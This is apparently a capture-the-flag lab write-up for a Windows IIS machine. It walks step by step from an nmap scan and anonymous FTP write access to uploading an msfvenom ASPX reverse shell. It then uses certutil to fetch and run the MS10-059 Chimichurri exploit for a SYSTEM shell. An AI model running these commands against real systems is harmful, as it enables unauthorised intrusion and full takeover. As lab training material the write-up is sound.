## Full TCP Port Scan (Aggressive) [113s]

```bash
sudo nmap -Pn -p- -A -T4 10.129.49.18
```

```text
Starting Nmap 7.95 (https://nmap.org) at 2025-03-06 05:44 EST
Nmap scan report for 10.129.49.18
Host is up (0.031s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 113.28 seconds
```

## Enumeration

### FTP Anonymous Access
Connect to FTP and list files:
```bash
ftp 10.129.49.18
```
```text
Name: anonymous
Password: (any email)
230 User logged in.
ftp> ls
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
```

### Web Server (Port 80)
- Files match FTP content at `http://10.129.49.18/`
- Web root is writable via FTP anonymous access

## Exploitation

### Reverse Shell Upload
Generate ASPX web shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.20 LPORT=1234 -f aspx > shell.aspx
```

Upload via FTP:
```bash
ftp> put shell.aspx
226 Transfer complete.
```

Start listener:
```bash
nc -lvnp 1234
```

Trigger shell:
```bash
curl http://10.129.49.18/shell.aspx
```

### Reverse Shell Connection
```text
connect to [10.10.16.20] from (UNKNOWN) [10.129.49.18] 49158
Microsoft Windows [Version 6.1.7600]
c:\windows\system32\inetsrv>
```

### User Flag
Located in babis' desktop:
```cmd
c:\> type c:\Users\babis\Desktop\user.txt
9ecd**********************
```

## Privilege Escalation

### System Analysis
- Windows Version: 6.1.7600 (Windows 7/2008 R2)
- Vulnerable to MS10-059 (Chimichurri)

### Exploit Transfer
On attacker machine:
```bash
python3 -m http.server 8888
```

On target:
```cmd
certutil -urlcache -f http://10.10.16.20:8888/Chimichurri.exe chimi.exe
```

### Privilege Escalation Execution
Start elevated listener:
```bash
nc -lvnp 1235
```

Execute exploit:
```cmd
chimi.exe 10.10.16.20 1235
```
```text
/Chimichurri/-->This exploit gives you a Local System shell <BR>
/Chimichurri/-->Changing registry values...<BR>
/Chimichurri/-->Got SYSTEM token...<BR>
/Chimichurri/-->Running reverse shell...<BR>
/Chimichurri/-->Restoring default registry values...<BR>
```

### Root Shell
```text
connect to [10.10.16.20] from (UNKNOWN) [10.129.49.18] 49172
Microsoft Windows [Version 6.1.7600]
c:\Windows\Temp> whoami
nt authority\system
```

### Root Flag
Located in Administrator's desktop:
```cmd
c:\> type c:\Users\Administrator\Desktop\root.txt
e621a**********************
```
